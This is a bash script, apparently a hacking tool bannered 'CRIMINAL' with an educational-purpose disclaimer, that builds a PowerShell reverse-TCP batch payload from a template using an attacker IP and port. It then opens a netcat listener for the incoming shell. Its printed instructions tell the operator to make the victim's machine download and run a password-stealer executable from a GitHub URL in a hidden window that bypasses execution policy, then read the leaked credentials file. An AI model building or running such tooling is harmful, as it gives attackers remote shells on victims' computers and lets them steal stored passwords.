#!/bin/bash/

trap 'printf "\n";stop;exit 1' 2
clear
printf "\e[1;31m ██████╗██████╗ ██╗███╗   ███╗██╗███╗   ██╗ █████╗ ██╗     \e[0m\n"
printf "\e[1;31m██╔════╝██╔══██╗██║████╗ ████║██║████╗  ██║██╔══██╗██║     \e[0m\n"
printf "\e[1;31m██║     ██████╔╝██║██╔████╔██║██║██╔██╗ ██║███████║██║     \e[0m\n"
printf "\e[1;31m██║     ██╔══██╗██║██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║     \e[0m\n"
printf "\e[1;31m╚██████╗██║  ██║██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗\e[0m\n"
printf "\e[1;31m ╚═════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝\e[0m\n"
printf "\e\n[1;93mStrictly For Educational Purpose.\e[0m\n"

command -v pwsh > /dev/null 2>&1 || { printf >&2 "\e[1;93mI require pwsh but it's not installed.Install it.Aborting.\napt install pwsh -y\n\e[0m"; exit 1; }
command -v nc > /dev/null 2>&1 || { printf >&2 "\e[1;93mI require netcat but it's not installed.Install it.Aborting.\napt install netcat -y\n\e[0m"; exit 1; }

echo ""
echo ""

printf "\e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;36m The Listener \e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;36m The Creator \e[0m\n"

read -p $'\n\e[1;93mEnter The Option: \e[0m' menu


if [[ $menu == 01 || $menu == 1 ]]
then
read -p $'\e\n[1;93mEnter The Port: \e[0m' port
echo""
printf "\e\n[1;93mListening... On Port\e[0m\e[1;31m $port \e[0m\n"
printf '''\n\e[1;32mType: \e[0m\e[1;93mpowershell -executionpolicy bypass -windowstyle hidden wget -o Stealer.exe "https://github.com/r00t-3xp10it/meterpeter/raw/master/mimiRatz/DarkRCovery.exe"\e[0m'''
printf "\e\n[1;32mType: \e[0m\e[1;93mStart Stealer.exe \e[0m\n"
printf "\e\n[1;32mType: \e[0m\e[1;93mcat Leaked.txt \e[0m\n\n"
nc -klvp $port
sleep 1


elif [[ $menu == 02 || $menu == 2  ]]
then
echo""
read -p $'\e\n[1;32mOutput Name: \e[0m' ps_tcp
read -p $'\e\n[1;32mIpAdress: \e[0m' ip
read -p $'\e\n[1;32mPort: \e[0m' port
cp script.vs powershell_reverse_tcp.txt
sed -i 's/_ipbat_/'$ip'/g' powershell_reverse_tcp.txt
sed -i 's/_portbat_/'$port'/g' powershell_reverse_tcp.txt
sleep 1
cp powershell_reverse_tcp.txt $ps_tcp.bat
rm -rf powershell_reverse_tcp.txt
printf "\e[1;36m Payload Is Created SuccessFully.\e[0m\n"
sleep 1
printf "\e\n[1;32m Output Path\e[0m \e[1;31m$(pwd)/$ps_tcp.bat\e[0m"
read -p $'\n\e[1;96m Did You Need To Listen???[Y/N] : \e[0m' Option
	if [[ $Option == Y || $Option == y ]]
	then
	printf "\e\n[1;93mListening... On Port\e[0m\e[1;31m $port \e[0m\n"
	printf '''\n\e[1;32mType: \e[0m\e[1;93mpowershell -executionpolicy bypass -windowstyle hidden wget -o Stealer.exe "https://github.com/r00t-3xp10it/meterpeter/raw/master/mimiRatz/DarkRCovery.exe"\e[0m'''
	printf "\e\n[1;32mType: \e[0m\e[1;93mStart Stealer.exe \e[0m\n"
	printf "\e\n[1;32mType: \e[0m\e[1;93mcat Leaked.txt \e[0m\n\n"
	nc -klvp $port
	sleep 1
	elif [[ $Option == N || $Option == n ]]
	then
	printf "\e[1;5;36m ..Bye..Bye..Bye..\e[0m\n"
	exit
	else
	printf "\e\n[1;5;31m-+-+-+-+-+-+-+-+--+-\e[0m\n"
	printf "\e\n[1;5;31m-+-Invalid Option-+-\e[0m\n"
	printf "\e\n[1;5;31m-+-+-+-+-+-+-+-+--+-\e[0m\n"
	fi
else
printf "\e\n[1;5;31m-+-+-+-+-+-+-+-+--+-\e[0m\n"
printf "\e\n[1;5;31m-+-Invalid Option-+-\e[0m\n"
printf "\e\n[1;5;31m-+-+-+-+-+-+-+-+--+-\e[0m\n"
sleep 3
fi
